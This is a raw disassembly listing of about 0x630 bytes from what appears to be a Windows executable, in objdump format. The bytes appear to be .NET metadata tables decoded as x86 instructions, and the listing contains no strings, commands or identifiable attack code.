  404d3f:	00 80 00 96 20 cd    	add    %al,-0x32df6a00(%eax)
  404d45:	04 50                	add    $0x50,%al
  404d47:	06                   	push   %es
  404d48:	1a 00                	sbb    (%eax),%al
  404d4a:	00 00                	add    %al,(%eax)
  404d4c:	00 00                	add    %al,(%eax)
  404d4e:	80 00 96             	addb   $0x96,(%eax)
  404d51:	20 96 16 55 06 1b    	and    %dl,0x1b065516(%esi)
  404d57:	00 00                	add    %al,(%eax)
  404d59:	00 00                	add    %al,(%eax)
  404d5b:	00 80 00 96 20 33    	add    %al,0x33209600(%eax)
  404d61:	07                   	pop    %es
  404d62:	5c                   	pop    %esp
  404d63:	06                   	push   %es
  404d64:	1d 00 00 00 00       	sbb    $0x0,%eax
  404d69:	00 80 00 96 20 6b    	add    %al,0x6b209600(%eax)
  404d6f:	0c 63                	or     $0x63,%al
  404d71:	06                   	push   %es
  404d72:	1e                   	push   %ds
  404d73:	00 bc 37 00 00 00 00 	add    %bh,0x0(%edi,%esi,1)
  404d7a:	96                   	xchg   %eax,%esi
  404d7b:	00 22                	add    %ah,(%edx)
  404d7d:	0a 6a 06             	or     0x6(%edx),%ch
  404d80:	21 00                	and    %eax,(%eax)
  404d82:	e8 37 00 00 00       	call   0x404dbe
  404d87:	00 96 00 70 15 c3    	add    %dl,-0x3cea9000(%esi)
  404d8d:	01 23                	add    %esp,(%ebx)
  404d8f:	00 30                	add    %dh,(%eax)
  404d91:	38 00                	cmp    %al,(%eax)
  404d93:	00 00                	add    %al,(%eax)
  404d95:	00 96 00 d1 15 c3    	add    %dl,-0x3cea2f00(%esi)
  404d9b:	01 23                	add    %esp,(%ebx)
  404d9d:	00 70 38             	add    %dh,0x38(%eax)
  404da0:	00 00                	add    %al,(%eax)
  404da2:	00 00                	add    %al,(%eax)
  404da4:	96                   	xchg   %eax,%esi
  404da5:	00 1c 09             	add    %bl,(%ecx,%ecx,1)
  404da8:	72 06                	jb     0x404db0
  404daa:	23 00                	and    (%eax),%eax
  404dac:	dc 38                	fdivrl (%eax)
  404dae:	00 00                	add    %al,(%eax)
  404db0:	00 00                	add    %al,(%eax)
  404db2:	96                   	xchg   %eax,%esi
  404db3:	00 13                	add    %dl,(%ebx)
  404db5:	09 62 00             	or     %esp,0x0(%edx)
  404db8:	25 00 4c 39 00       	and    $0x394c00,%eax
  404dbd:	00 00                	add    %al,(%eax)
  404dbf:	00 96 00 07 09 36    	add    %dl,0x36090700(%esi)
  404dc5:	00 26                	add    %ah,(%esi)
  404dc7:	00 b8 39 00 00 00    	add    %bh,0x39(%eax)
  404dcd:	00 96 00 ed 17 d0    	add    %dl,-0x2fe81300(%esi)
  404dd3:	02 27                	add    (%edi),%ah
  404dd5:	00 28                	add    %ch,(%eax)
  404dd7:	3a 00                	cmp    (%eax),%al
  404dd9:	00 00                	add    %al,(%eax)
  404ddb:	00 91 18 eb 11 c3    	add    %dl,-0x3cee14e8(%ecx)
  404de1:	01 27                	add    %esp,(%edi)
  404de3:	00 40 3a             	add    %al,0x3a(%eax)
  404de6:	00 00                	add    %al,(%eax)
  404de8:	00 00                	add    %al,(%eax)
  404dea:	96                   	xchg   %eax,%esi
  404deb:	00 4c 02 a5          	add    %cl,-0x5b(%edx,%eax,1)
  404def:	01 27                	add    %esp,(%edi)
  404df1:	00 a8 3c 00 00 00    	add    %ch,0x3c(%eax)
  404df7:	00 91 00 91 04 79    	add    %dl,0x79049100(%ecx)
  404dfd:	06                   	push   %es
  404dfe:	28 00                	sub    %al,(%eax)
  404e00:	d0 3d 00 00 00 00    	sarb   $1,0x0
  404e06:	91                   	xchg   %eax,%ecx
  404e07:	00 9d 02 c3 01 29    	add    %bl,0x2901c302(%ebp)
  404e0d:	00 14 3e             	add    %dl,(%esi,%edi,1)
  404e10:	00 00                	add    %al,(%eax)
  404e12:	00 00                	add    %al,(%eax)
  404e14:	96                   	xchg   %eax,%esi
  404e15:	00 ac 11 e3 00 29 00 	add    %ch,0x2900e3(%ecx,%edx,1)
  404e1c:	5c                   	pop    %esp
  404e1d:	3e 00 00             	add    %al,%ds:(%eax)
  404e20:	00 00                	add    %al,(%eax)
  404e22:	91                   	xchg   %eax,%ecx
  404e23:	18 eb                	sbb    %ch,%bl
  404e25:	11 c3                	adc    %eax,%ebx
  404e27:	01 2a                	add    %ebp,(%edx)
  404e29:	00 68 3e             	add    %ch,0x3e(%eax)
  404e2c:	00 00                	add    %al,(%eax)
  404e2e:	00 00                	add    %al,(%eax)
  404e30:	86 18                	xchg   %bl,(%eax)
  404e32:	e5 11                	in     $0x11,%eax
  404e34:	10 00                	adc    %al,(%eax)
  404e36:	2a 00                	sub    (%eax),%al
  404e38:	e0 3e                	loopne 0x404e78
  404e3a:	00 00                	add    %al,(%eax)
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	86 00                	xchg   %al,(%eax)
  404e40:	0d 17 ce 00 2b       	or     $0x2b00ce17,%eax
  404e45:	00 08                	add    %cl,(%eax)
  404e47:	3f                   	aas
  404e48:	00 00                	add    %al,(%eax)
  404e4a:	00 00                	add    %al,(%eax)
  404e4c:	86 00                	xchg   %al,(%eax)
  404e4e:	0d 17 aa 02 2c       	or     $0x2c02aa17,%eax
  404e53:	00 70 40             	add    %dh,0x40(%eax)
  404e56:	00 00                	add    %al,(%eax)
  404e58:	00 00                	add    %al,(%eax)
  404e5a:	86 00                	xchg   %al,(%eax)
  404e5c:	05 17 ce 00 2d       	add    $0x2d00ce17,%eax
  404e61:	00 98 40 00 00 00    	add    %bl,0x40(%eax)
  404e67:	00 86 00 05 17 aa    	add    %al,-0x55e8fb00(%esi)
  404e6d:	02 2e                	add    (%esi),%ch
  404e6f:	00 60 42             	add    %ah,0x42(%eax)
  404e72:	00 00                	add    %al,(%eax)
  404e74:	48                   	dec    %eax
  404e75:	00 81 00 d0 0c 80    	add    %al,-0x7ff33000(%ecx)
  404e7b:	06                   	push   %es
  404e7c:	2f                   	das
  404e7d:	00 9c 42 00 00 00 00 	add    %bl,0x0(%edx,%eax,2)
  404e84:	91                   	xchg   %eax,%ecx
  404e85:	18 eb                	sbb    %ch,%bl
  404e87:	11 c3                	adc    %eax,%ebx
  404e89:	01 31                	add    %esi,(%ecx)
  404e8b:	00 b8 42 00 00 00    	add    %bh,0x42(%eax)
  404e91:	00 96 00 34 0b 5d    	add    %dl,0x5d0b3400(%esi)
  404e97:	00 31                	add    %dh,(%ecx)
  404e99:	00 44 43 00          	add    %al,0x0(%ebx,%eax,2)
  404e9d:	00 00                	add    %al,(%eax)
  404e9f:	00 96 00 34 0b fe    	add    %dl,-0x1f4cc00(%esi)
  404ea5:	03 32                	add    (%edx),%esi
  404ea7:	00 00                	add    %al,(%eax)
  404ea9:	00 01                	add    %al,(%ecx)
  404eab:	00 25 09 00 00 01    	add    %ah,0x1000009
  404eb1:	00 25 09 00 00 01    	add    %ah,0x1000009
  404eb7:	00 25 09 00 00 01    	add    %ah,0x1000009
  404ebd:	00 25 09 00 00 01    	add    %ah,0x1000009
  404ec3:	00 25 09 00 00 01    	add    %ah,0x1000009
  404ec9:	00 25 09 00 00 01    	add    %ah,0x1000009
  404ecf:	00 25 09 00 00 01    	add    %ah,0x1000009
  404ed5:	00 25 09 00 00 01    	add    %ah,0x1000009
  404edb:	00 25 09 00 00 01    	add    %ah,0x1000009
  404ee1:	00 25 09 00 00 01    	add    %ah,0x1000009
  404ee7:	00 be 0b 00 00 01    	add    %bh,0x100000b(%esi)
  404eed:	00 2e                	add    %ch,(%esi)
  404eef:	06                   	push   %es
  404ef0:	00 00                	add    %al,(%eax)
  404ef2:	01 00                	add    %eax,(%eax)
  404ef4:	94                   	xchg   %eax,%esp
  404ef5:	10 00                	adc    %al,(%eax)
  404ef7:	00 02                	add    %al,(%edx)
  404ef9:	00 09                	add    %cl,(%ecx)
  404efb:	07                   	pop    %es
  404efc:	00 00                	add    %al,(%eax)
  404efe:	03 00                	add    (%eax),%eax
  404f00:	28 0e                	sub    %cl,(%esi)
  404f02:	00 00                	add    %al,(%eax)
  404f04:	04 00                	add    $0x0,%al
  404f06:	7d 14                	jge    0x404f1c
  404f08:	00 00                	add    %al,(%eax)
  404f0a:	01 00                	add    %eax,(%eax)
  404f0c:	14 10                	adc    $0x10,%al
  404f0e:	00 00                	add    %al,(%eax)
  404f10:	01 00                	add    %eax,(%eax)
  404f12:	2a 0b                	sub    (%ebx),%cl
  404f14:	00 00                	add    %al,(%eax)
  404f16:	01 00                	add    %eax,(%eax)
  404f18:	be 0b 00 00 01       	mov    $0x100000b,%esi
  404f1d:	00 be 0b 00 00 01    	add    %bh,0x100000b(%esi)
  404f23:	00 40 0b             	add    %al,0xb(%eax)
  404f26:	00 00                	add    %al,(%eax)
  404f28:	01 00                	add    %eax,(%eax)
  404f2a:	1b 15 00 00 01 00    	sbb    0x10000,%edx
  404f30:	d6                   	salc
  404f31:	03 00                	add    (%eax),%eax
  404f33:	00 02                	add    %al,(%edx)
  404f35:	00 6f 17             	add    %ch,0x17(%edi)
  404f38:	00 00                	add    %al,(%eax)
  404f3a:	03 00                	add    (%eax),%eax
  404f3c:	f3 16                	repz push %ss
  404f3e:	00 00                	add    %al,(%eax)
  404f40:	01 00                	add    %eax,(%eax)
  404f42:	c8 05 00 00          	enter  $0x5,$0x0
  404f46:	01 00                	add    %eax,(%eax)
  404f48:	8d 14 00             	lea    (%eax,%eax,1),%edx
  404f4b:	00 02                	add    %al,(%edx)
  404f4d:	00 b1 16 00 00 01    	add    %dh,0x1000016(%ecx)
  404f53:	00 90 13 00 00 01    	add    %dl,0x1000013(%eax)
  404f59:	00 35 00 00 00 02    	add    %dh,0x2000000
  404f5f:	00 88 00 00 00 03    	add    %cl,0x3000000(%eax)
  404f65:	00 8b 00 00 00 01    	add    %cl,0x1000000(%ebx)
  404f6b:	00 94 10 00 00 02 00 	add    %dl,0x20000(%eax,%edx,1)
  404f72:	c8 09 00 00          	enter  $0x9,$0x0
  404f76:	01 00                	add    %eax,(%eax)
  404f78:	2e 06                	cs push %es
  404f7a:	00 00                	add    %al,(%eax)
  404f7c:	02 00                	add    (%eax),%al
  404f7e:	25 09 00 00 01       	and    $0x1000009,%eax
  404f83:	00 25 09 00 00 01    	add    %ah,0x1000009
  404f89:	00 2e                	add    %ch,(%esi)
  404f8b:	06                   	push   %es
  404f8c:	00 00                	add    %al,(%eax)
  404f8e:	01 00                	add    %eax,(%eax)
  404f90:	e4 01                	in     $0x1,%al
  404f92:	00 00                	add    %al,(%eax)
  404f94:	01 00                	add    %eax,(%eax)
  404f96:	25 0c 00 00 01       	and    $0x100000c,%eax
  404f9b:	00 af 17 00 00 01    	add    %ch,0x1000017(%edi)
  404fa1:	00 1c 18             	add    %bl,(%eax,%ebx,1)
  404fa4:	00 00                	add    %al,(%eax)
  404fa6:	01 00                	add    %eax,(%eax)
  404fa8:	46                   	inc    %esi
  404fa9:	17                   	pop    %ss
  404faa:	00 00                	add    %al,(%eax)
  404fac:	01 00                	add    %eax,(%eax)
  404fae:	46                   	inc    %esi
  404faf:	17                   	pop    %ss
  404fb0:	00 00                	add    %al,(%eax)
  404fb2:	01 00                	add    %eax,(%eax)
  404fb4:	46                   	inc    %esi
  404fb5:	17                   	pop    %ss
  404fb6:	00 00                	add    %al,(%eax)
  404fb8:	01 00                	add    %eax,(%eax)
  404fba:	46                   	inc    %esi
  404fbb:	17                   	pop    %ss
  404fbc:	00 00                	add    %al,(%eax)
  404fbe:	01 00                	add    %eax,(%eax)
  404fc0:	32 00                	xor    (%eax),%al
  404fc2:	00 00                	add    %al,(%eax)
  404fc4:	02 00                	add    (%eax),%al
  404fc6:	74 00                	je     0x404fc8
  404fc8:	00 00                	add    %al,(%eax)
  404fca:	01 00                	add    %eax,(%eax)
  404fcc:	46                   	inc    %esi
  404fcd:	17                   	pop    %ss
  404fce:	00 00                	add    %al,(%eax)
  404fd0:	01 00                	add    %eax,(%eax)
  404fd2:	46                   	inc    %esi
  404fd3:	17                   	pop    %ss
  404fd4:	09 00                	or     %eax,(%eax)
  404fd6:	e5 11                	in     $0x11,%eax
  404fd8:	01 00                	add    %eax,(%eax)
  404fda:	11 00                	adc    %eax,(%eax)
  404fdc:	e5 11                	in     $0x11,%eax
  404fde:	06                   	push   %es
  404fdf:	00 19                	add    %bl,(%ecx)
  404fe1:	00 e5                	add    %ah,%ch
  404fe3:	11 0a                	adc    %ecx,(%edx)
  404fe5:	00 29                	add    %ch,(%ecx)
  404fe7:	00 e5                	add    %ah,%ch
  404fe9:	11 10                	adc    %edx,(%eax)
  404feb:	00 31                	add    %dh,(%ecx)
  404fed:	00 e5                	add    %ah,%ch
  404fef:	11 10                	adc    %edx,(%eax)
  404ff1:	00 39                	add    %bh,(%ecx)
  404ff3:	00 e5                	add    %ah,%ch
  404ff5:	11 10                	adc    %edx,(%eax)
  404ff7:	00 41 00             	add    %al,0x0(%ecx)
  404ffa:	e5 11                	in     $0x11,%eax
  404ffc:	10 00                	adc    %al,(%eax)
  404ffe:	49                   	dec    %ecx
  404fff:	00 e5                	add    %ah,%ch
  405001:	11 10                	adc    %edx,(%eax)
  405003:	00 51 00             	add    %dl,0x0(%ecx)
  405006:	e5 11                	in     $0x11,%eax
  405008:	10 00                	adc    %al,(%eax)
  40500a:	59                   	pop    %ecx
  40500b:	00 e5                	add    %ah,%ch
  40500d:	11 10                	adc    %edx,(%eax)
  40500f:	00 61 00             	add    %ah,0x0(%ecx)
  405012:	e5 11                	in     $0x11,%eax
  405014:	15 00 69 00 e5       	adc    $0xe5006900,%eax
  405019:	11 10                	adc    %edx,(%eax)
  40501b:	00 71 00             	add    %dh,0x0(%ecx)
  40501e:	e5 11                	in     $0x11,%eax
  405020:	10 00                	adc    %al,(%eax)
  405022:	99                   	cltd
  405023:	00 e5                	add    %ah,%ch
  405025:	11 06                	adc    %eax,(%esi)
  405027:	00 a9 00 e5 11 1a    	add    %ch,0x1a11e500(%ecx)
  40502d:	00 01                	add    %al,(%ecx)
  40502f:	01 cc                	add    %ecx,%esp
  405031:	0f 2c 00             	cvttps2pi (%eax),%mm0
  405034:	11 02                	adc    %eax,(%edx)
  405036:	65 00 31             	add    %dh,%gs:(%ecx)
  405039:	00 19                	add    %bl,(%ecx)
  40503b:	02 d1                	add    %cl,%dl
  40503d:	15 2c 00 11 02       	adc    $0x211002c,%eax
  405042:	07                   	pop    %es
  405043:	0e                   	push   %cs
  405044:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  405048:	e5 11                	in     $0x11,%eax
  40504a:	06                   	push   %es
  40504b:	00 81 00 05 18 45    	add    %al,0x45180500(%ecx)
  405051:	00 21                	add    %ah,(%ecx)
  405053:	02 d0                	add    %al,%dl
  405055:	17                   	pop    %ss
  405056:	4b                   	dec    %ebx
  405057:	00 31                	add    %dh,(%ecx)
  405059:	02 b4 00 51 00 31 02 	add    0x2310051(%eax,%eax,1),%dh
  405060:	5d                   	pop    %ebp
  405061:	13 57 00             	adc    0x0(%edi),%edx
  405064:	39 02                	cmp    %eax,(%edx)
  405066:	50                   	push   %eax
  405067:	01 5d 00             	add    %ebx,0x0(%ebp)
  40506a:	11 02                	adc    %eax,(%edx)
  40506c:	77 0a                	ja     0x405078
  40506e:	62 00                	bound  %eax,(%eax)
  405070:	89 00                	mov    %eax,(%eax)
  405072:	52                   	push   %edx
  405073:	0b 68 00             	or     0x0(%eax),%ebp
  405076:	b1 00                	mov    $0x0,%cl
  405078:	e5 11                	in     $0x11,%eax
  40507a:	8a 00                	mov    (%eax),%al
  40507c:	b1 00                	mov    $0x0,%cl
  40507e:	a8 09                	test   $0x9,%al
  405080:	01 00                	add    %eax,(%eax)
  405082:	b1 00                	mov    $0x0,%cl
  405084:	95                   	xchg   %eax,%ebp
  405085:	09 01                	or     %eax,(%ecx)
  405087:	00 59 02             	add    %bl,0x2(%ecx)
  40508a:	95                   	xchg   %eax,%ebp
  40508b:	18 97 00 59 02 c3    	sbb    %dl,-0x3cfda700(%edi)
  405091:	15 9d 00 69 02       	adc    $0x269009d,%eax
  405096:	e5 11                	in     $0x11,%eax
  405098:	06                   	push   %es
  405099:	00 69 02             	add    %ch,0x2(%ecx)
  40509c:	50                   	push   %eax
  40509d:	17                   	pop    %ss
  40509e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40509f:	00 71 02             	add    %dh,0x2(%ecx)
  4050a2:	d6                   	salc
  4050a3:	12 a9 00 b1 00 4f    	adc    0x4f00b100(%ecx),%ch
  4050a9:	15 b0 00 b1 00       	adc    $0xb100b0,%eax
  4050ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4050af:	02 b7 00 b1 00 4f    	add    0x4f00b100(%edi),%dh
  4050b5:	15 bb 00 d1 00       	adc    $0xd100bb,%eax
  4050ba:	e5 11                	in     $0x11,%eax
  4050bc:	06                   	push   %es
  4050bd:	00 d9                	add    %bl,%cl
  4050bf:	00 e5                	add    %ah,%ch
  4050c1:	11 c1                	adc    %eax,%ecx
  4050c3:	00 d1                	add    %dl,%cl
  4050c5:	00 fb                	add    %bh,%bl
  4050c7:	13 c7                	adc    %edi,%eax
  4050c9:	00 d1                	add    %dl,%cl
  4050cb:	00 97 0a ce 00 59    	add    %dl,0x5900ce0a(%edi)
  4050d1:	02 c3                	add    %bl,%al
  4050d3:	15 d3 00 69 02       	adc    $0x26900d3,%eax
  4050d8:	50                   	push   %eax
  4050d9:	17                   	pop    %ss
  4050da:	dd 00                	fldl   (%eax)
  4050dc:	89 02                	mov    %eax,(%edx)
  4050de:	cc                   	int3
  4050df:	06                   	push   %es
  4050e0:	06                   	push   %es
  4050e1:	00 91 02 5e 06 e3    	add    %dl,-0x1cf9a1fe(%ecx)
  4050e7:	00 99 02 e5 11 e8    	add    %bl,-0x17ee1afe(%ecx)
  4050ed:	00 a1 02 e5 11 ef    	add    %ah,-0x10ee1afe(%ecx)
  4050f3:	00 b9 00 e5 11 f5    	add    %bh,-0xaee1b00(%ecx)
  4050f9:	00 b1 00 c3 16 00    	add    %dh,0x16c300(%ecx)
  4050ff:	01 79 00             	add    %edi,0x0(%ecx)
  405102:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405103:	0a 06                	or     (%esi),%al
  405105:	01 b9 00 4c 16 0a    	add    %edi,0xa164c00(%ecx)
  40510b:	01 d1                	add    %edx,%ecx
  40510d:	02 e5                	add    %ch,%ah
  40510f:	11 ef                	adc    %ebp,%edi
  405111:	00 c1                	add    %al,%cl
  405113:	00 e5                	add    %ah,%ch
  405115:	11 16                	adc    %edx,(%esi)
  405117:	01 d9                	add    %ebx,%ecx
  405119:	02 e5                	add    %ch,%ah
  40511b:	11 ef                	adc    %ebp,%edi
  40511d:	00 a9 02 47 02 20    	add    %ch,0x20024702(%ecx)
  405123:	01 e1                	add    %esp,%ecx
  405125:	02 20                	add    (%eax),%ah
  405127:	06                   	push   %es
  405128:	2d 01 a9 02 cc       	sub    $0xcc02a901,%eax
  40512d:	06                   	push   %es
  40512e:	06                   	push   %es
  40512f:	00 b1 00 cc 06 06    	add    %dh,0x606cc00(%ecx)
  405135:	00 c1                	add    %al,%cl
  405137:	00 cc                	add    %cl,%ah
  405139:	06                   	push   %es
  40513a:	06                   	push   %es
  40513b:	00 a9 02 3f 02 45    	add    %ch,0x45023f02(%ecx)
  405141:	01 f1                	add    %esi,%ecx
  405143:	02 65 00             	add    0x0(%ebp),%ah
  405146:	4b                   	dec    %ebx
  405147:	01 f9                	add    %edi,%ecx
  405149:	02 a6 0a 06 01 59    	add    0x5901060a(%esi),%ah
  40514f:	02 08                	add    (%eax),%cl
  405151:	15 52 01 a9 02       	adc    $0x2a90152,%eax
  405156:	4c                   	dec    %esp
  405157:	02 59 01             	add    0x1(%ecx),%bl
  40515a:	01 03                	add    %eax,(%ebx)
  40515c:	e5 11                	in     $0x11,%eax
  40515e:	ef                   	out    %eax,(%dx)
  40515f:	00 01                	add    %al,(%ecx)
  405161:	01 e5                	add    %esp,%ebp
  405163:	11 61 01             	adc    %esp,0x1(%ecx)
  405166:	01 01                	add    %eax,(%ecx)
  405168:	28 17                	sub    %dl,(%edi)
  40516a:	68 01 09 03 91       	push   $0x91030901
  40516f:	11 7d 01             	adc    %edi,0x1(%ebp)
  405172:	f1                   	int1
  405173:	02 5d 13             	add    0x13(%ebp),%bl
  405176:	84 01                	test   %al,(%ecx)
  405178:	b1 00                	mov    $0x0,%cl
  40517a:	29 0d 8a 01 a9 02    	sub    %ecx,0x2a9018a
  405180:	5b                   	pop    %ebx
  405181:	07                   	pop    %es
  405182:	92                   	xchg   %eax,%edx
  405183:	01 09                	add    %ecx,(%ecx)
  405185:	01 e5                	add    %esp,%ebp
  405187:	11 9a 01 a9 02 0e    	adc    %ebx,0xe02a901(%edx)
  40518d:	0f a0                	push   %fs
  40518f:	01 a9 02 5d 0b 06    	add    %ebp,0x60b5d02(%ecx)
  405195:	00 09                	add    %cl,(%ecx)
  405197:	03 d1                	add    %ecx,%edx
  405199:	15 a5 01 11 01       	adc    $0x11101a5,%eax
  40519e:	e5 11                	in     $0x11,%eax
  4051a0:	06                   	push   %es
  4051a1:	00 11                	add    %dl,(%ecx)
  4051a3:	01 37                	add    %esi,(%edi)
  4051a5:	15 b1 01 11 01       	adc    $0x11101b1,%eax
  4051aa:	bc 0a 10 00 59       	mov    $0x5900100a,%esp
  4051af:	02 e5                	add    %ch,%ah
  4051b1:	11 b8 01 11 01 15    	adc    %edi,0x15011101(%eax)
  4051b7:	13 be 01 19 03 47    	adc    0x47031901(%esi),%edi
  4051bd:	15 c3 01 19 02       	adc    $0x21901c3,%eax
  4051c2:	ae                   	scas   %es:(%edi),%al
  4051c3:	12 5d 00             	adc    0x0(%ebp),%bl
  4051c6:	21 03                	and    %eax,(%ebx)
  4051c8:	68 06 eb 01 19       	push   $0x1901eb06
  4051cd:	01 e5                	add    %esp,%ebp
  4051cf:	11 10                	adc    %edx,(%eax)
  4051d1:	00 29                	add    %ch,(%ecx)
  4051d3:	01 96 14 f1 01 29    	add    %edx,0x2901f114(%esi)
  4051d9:	01 49 05             	add    %ecx,0x5(%ecx)
  4051dc:	f7 01 29 03 92 05    	testl  $0x5920329,(%ecx)
  4051e2:	06                   	push   %es
  4051e3:	01 31                	add    %esi,(%ecx)
  4051e5:	03 f4                	add    %esp,%esi
  4051e7:	05 06 01 59 02       	add    $0x2590106,%eax
  4051ec:	a1 18 97 00 29       	mov    0x29009718,%eax
  4051f1:	01 c9                	add    %ecx,%ecx
  4051f3:	12 fd                	adc    %ch,%bh
  4051f5:	01 29                	add    %ebp,(%ecx)
  4051f7:	01 24 0d 06 00 31 01 	add    %esp,0x1310006(,%ecx,1)
  4051fe:	e5 11                	in     $0x11,%eax
  405200:	06                   	push   %es
  405201:	00 31                	add    %dh,(%ecx)
  405203:	01 9f 05 10 00 31    	add    %ebx,0x31001005(%edi)
  405209:	03 89 05 06 01 21    	add    0x21010605(%ecx),%ecx
  40520f:	03 60 0e             	add    0xe(%eax),%esp
  405212:	5d                   	pop    %ebp
  405213:	00 59 02             	add    %bl,0x2(%ecx)
  405216:	08 15 04 02 31 01    	or     %dl,0x1310204
  40521c:	d0 14 10             	rclb   $1,(%eax,%edx,1)
  40521f:	00 31                	add    %dh,(%ecx)
  405221:	01 66 05             	add    %esp,0x5(%esi)
  405224:	0a 02                	or     (%edx),%al
  405226:	31 01                	xor    %eax,(%ecx)
  405228:	88 17                	mov    %dl,(%edi)
  40522a:	15 00 29 01 28       	adc    $0x28012900,%eax
  40522f:	17                   	pop    %ss
  405230:	11 02                	adc    %eax,(%edx)
  405232:	41                   	inc    %ecx
  405233:	03 6d 11             	add    0x11(%ebp),%ebp
  405236:	1a 02                	sbb    (%edx),%al
  405238:	49                   	dec    %ecx
  405239:	03 d4                	add    %esp,%edx
  40523b:	06                   	push   %es
  40523c:	5d                   	pop    %ebp
  40523d:	00 39                	add    %bh,(%ecx)
  40523f:	01 fa                	add    %edi,%edx
  405241:	17                   	pop    %ss
  405242:	1f                   	pop    %ds
  405243:	02 39                	add    (%ecx),%bh
  405245:	01 1c 09             	add    %ebx,(%ecx,%ecx,1)
  405248:	29 02                	sub    %eax,(%edx)
  40524a:	59                   	pop    %ecx
  40524b:	03 f1                	add    %ecx,%esi
  40524d:	14 36                	adc    $0x36,%al
  40524f:	00 59 03             	add    %bl,0x3(%ecx)
  405252:	4b                   	dec    %ebx
  405253:	07                   	pop    %es
  405254:	e3 00                	jecxz  0x405256
  405256:	21 01                	and    %eax,(%ecx)
  405258:	e5 11                	in     $0x11,%eax
  40525a:	2f                   	das
  40525b:	02 59 03             	add    0x3(%ecx),%bl
  40525e:	35 13 62 00 21       	xor    $0x21006213,%eax
  405263:	03 ac 05 37 02 59 02 	add    0x2590237(%ebp,%eax,1),%ebp
  40526a:	08 15 eb 01 41 01    	or     %dl,0x14101eb
  405270:	e5 11                	in     $0x11,%eax
  405272:	10 00                	adc    %al,(%eax)
  405274:	69 03 5e 06 10 00    	imul   $0x10065e,(%ebx),%eax
  40527a:	21 03                	and    %eax,(%ebx)
  40527c:	76 0b                	jbe    0x405289
  40527e:	37                   	aaa
  40527f:	02 21                	add    (%ecx),%ah
  405281:	03 bc 05 5d 00 31 01 	add    0x131005d(%ebp,%eax,1),%edi
  405288:	1a 0b                	sbb    (%ebx),%cl
  40528a:	15 00 31 01 ee       	adc    $0xee013100,%eax
  40528f:	08 15 00 91 00 75    	or     %dl,0x75009100
  405295:	04 06                	add    $0x6,%al
  405297:	01 19                	add    %ebx,(%ecx)
  405299:	02 36                	add    (%esi),%dh
  40529b:	17                   	pop    %ss
  40529c:	e3 00                	jecxz  0x40529e
  40529e:	19 02                	sbb    %eax,(%edx)
  4052a0:	75 18                	jne    0x4052ba
  4052a2:	37                   	aaa
  4052a3:	02 21                	add    (%ecx),%ah
  4052a5:	03 f9                	add    %ecx,%edi
  4052a7:	16                   	push   %ss
  4052a8:	5d                   	pop    %ebp
  4052a9:	00 71 03             	add    %dh,0x3(%ecx)
  4052ac:	e5 11                	in     $0x11,%eax
  4052ae:	10 00                	adc    %al,(%eax)
  4052b0:	71 03                	jno    0x4052b5
  4052b2:	69 09 41 02 79 03    	imul   $0x3790241,(%ecx),%ecx
  4052b8:	e5 11                	in     $0x11,%eax
  4052ba:	06                   	push   %es
  4052bb:	00 79 03             	add    %bh,0x3(%ecx)
  4052be:	e5 05                	in     $0x5,%eax
  4052c0:	06                   	push   %es
  4052c1:	01 59 02             	add    %ebx,0x2(%ecx)
  4052c4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4052c5:	11 06                	adc    %eax,(%esi)
  4052c7:	01 59 02             	add    %ebx,0x2(%ecx)
  4052ca:	31 14 4a             	xor    %edx,(%edx,%ecx,2)
  4052cd:	02 49 01             	add    0x1(%ecx),%cl
  4052d0:	e5 11                	in     $0x11,%eax
  4052d2:	10 00                	adc    %al,(%eax)
  4052d4:	49                   	dec    %ecx
  4052d5:	01 61 15             	add    %esp,0x15(%ecx)
  4052d8:	61                   	popa
  4052d9:	02 51 01             	add    0x1(%ecx),%dl
  4052dc:	cd 11                	int    $0x11
  4052de:	67 02 59 01          	add    0x1(%bx,%di),%bl
  4052e2:	7f 16                	jg     0x4052fa
  4052e4:	6d                   	insl   (%dx),%es:(%edi)
  4052e5:	02 61 01             	add    0x1(%ecx),%ah
  4052e8:	80 0d 73 02 59 02 e8 	orb    $0xe8,0x2590273
  4052ef:	15 06 01 59 01       	adc    $0x1590106,%eax
  4052f4:	4c                   	dec    %esp
  4052f5:	17                   	pop    %ss
  4052f6:	b7 00                	mov    $0x0,%bh
  4052f8:	29 01                	sub    %eax,(%ecx)
  4052fa:	af                   	scas   %es:(%edi),%eax
  4052fb:	04 78                	add    $0x78,%al
  4052fd:	02 81 03 65 00 82    	add    -0x7dff9afd(%ecx),%al
  405303:	02 19                	add    (%ecx),%bl
  405305:	02 e0                	add    %al,%ah
  405307:	16                   	push   %ss
  405308:	8a 02                	mov    (%edx),%al
  40530a:	19 02                	sbb    %eax,(%edx)
  40530c:	13 06                	adc    (%esi),%eax
  40530e:	37                   	aaa
  40530f:	02 19                	add    (%ecx),%bl
  405311:	02 d5                	add    %ch,%dl
  405313:	05 37 02 19 02       	add    $0x2190237,%eax
  405318:	7c 0e                	jl     0x405328
  40531a:	8e 02                	mov    (%edx),%es
  40531c:	59                   	pop    %ecx
  40531d:	02 08                	add    (%eax),%cl
  40531f:	15 94 02 69 01       	adc    $0x1690294,%eax
  405324:	e5 11                	in     $0x11,%eax
  405326:	06                   	push   %es
  405327:	00 31                	add    %dh,(%ecx)
  405329:	02 7a 01             	add    0x1(%edx),%bh
  40532c:	51                   	push   %ecx
  40532d:	00 99 03 34 0b aa    	add    %bl,-0x55f4cbfd(%ecx)
  405333:	02 71 01             	add    0x1(%ecx),%dh
  405336:	e5 11                	in     $0x11,%eax
  405338:	06                   	push   %es
  405339:	00 c9                	add    %cl,%cl
  40533b:	02 a6 0a ce 00 71    	add    0x7100ce0a(%esi),%ah
  405341:	01 e0                	add    %esp,%eax
  405343:	03 b1 02 59 02 df    	add    -0x20fda6fe(%ecx),%esi
  405349:	0a b8 02 59 02 52    	or     0x52025902(%eax),%bh
  40534f:	11 06                	adc    %eax,(%esi)
  405351:	01 59 02             	add    %ebx,0x2(%ecx)
  405354:	f9                   	stc
  405355:	03 ca                	add    %edx,%ecx
  405357:	02 19                	add    (%ecx),%bl
  405359:	02 89 0d d0 02 a1    	add    -0x5efd2ff3(%ecx),%cl
  40535f:	03 a6 0a 06 01 a9    	add    -0x56fef9f6(%esi),%esp
  405365:	03 63 0b             	add    0xb(%ebx),%esp
  405368:	37                   	aaa
  405369:	02 31                	add    (%ecx),%dh
